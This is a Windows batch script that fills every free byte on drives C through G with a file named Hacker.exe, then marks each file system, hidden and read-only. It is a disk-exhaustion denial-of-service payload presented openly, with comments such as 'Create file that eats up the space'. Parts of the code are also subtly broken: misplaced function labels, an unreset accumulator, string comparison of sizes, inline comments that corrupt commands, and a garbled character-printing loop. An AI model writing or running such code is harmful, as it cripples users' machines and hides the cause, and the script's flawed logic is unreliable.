@echo off
setlocal EnableDelayedExpansion  :: Enables delayed variable expansion using !var!

:: Define the drive letters to iterate through
set "drives=C D E F G"

:: Temp file path to store free space info
set "freeSpaceFile=%temp%\freeSpace.tmp"

:: Prefix used for temporary files when querying drive info
set "tempFilePrefix=%temp%\drive"

:: === Function to get the free space on a given drive ===
:getFreeSpace
    set "drive=%~1"  :: Get the drive letter from function argument
    set "tempFile=%tempFilePrefix%!drive!.tmp"  :: Construct temp file path for this drive

    :: Use WMIC to get free space info and write it to temp file
    wmic logicaldisk where "caption='%drive%:'" get freespace /value > "!tempFile!"

    :: Parse the FreeSpace value from the temp file and store in !free!
    for /f "tokens=2 delims==" %%A in ('findstr /i "FreeSpace" "!tempFile!"') do (
        set "free=!free!%%A"
    )

    :: Delete temp file after use
    del "!tempFile!"
    goto :eof

:: === Function to create a hidden file with size equal to free space on drive ===
:createAndHideFile
    set "drive=%~1"     :: Drive letter
    set "free=%~2"      :: Free space value

    :: Set file path to root of drive (e.g., D:\Hacker.exe)
    set "filePath=!drive!:\Hacker.exe"

    :: If there's free space, create a file that consumes it
    if "!free!" gtr "0" (
        fsutil file createnew "!filePath!" !free!        :: Create dummy file with specified size
        attrib +s +h +r "!filePath!"                      :: Make it system, hidden, and read-only
        echo Created and hid file on !drive! with size !free! bytes.
    ) else (
        echo The drive !drive! is full or not available!
    )
    goto :eof

:: === Main Execution Block ===

:: Generate a random suffix (not actually used in logic below)
set "randomSuffix=!random!!random!"

:: Loop through all drives and collect free space + create hidden file
for %%D in (%drives%) do (
    call :getFreeSpace %%D                         :: Get free space for drive
    set "freeSpace%%D=!free!"                      :: Save free space for later use
    call :createAndHideFile %%D !free!             :: Create file that eats up the space
)

:: === Additional logic to summarize and print results ===

:: Initialize total free space counter
set "totalFree=0"

:: Sum all the free space values and print them
for %%D in (%drives%) do (
    set /a "totalFree+=!freeSpace%%D!"             :: Add to total free
    echo Free space on %%D: !freeSpace%%D! bytes   :: Display per-drive free space
)

:: === Obfuscated echo for fun — prints message one char at a time ===

set "msg=Script execution completed."
set "chars="

:: Loop through the first 32 characters of the message
for /l %%i in (0,1,31) do (
    :: Extract character at position %%i and append to chars
    for /f "tokens=1,2 delims==" %%a in ('cmd /c "echo(%%msg:~%%i,1%%%"') do (
        set "chars=!chars!%%a"
    )
)

:: Display the final message
echo !chars!

pause
exit
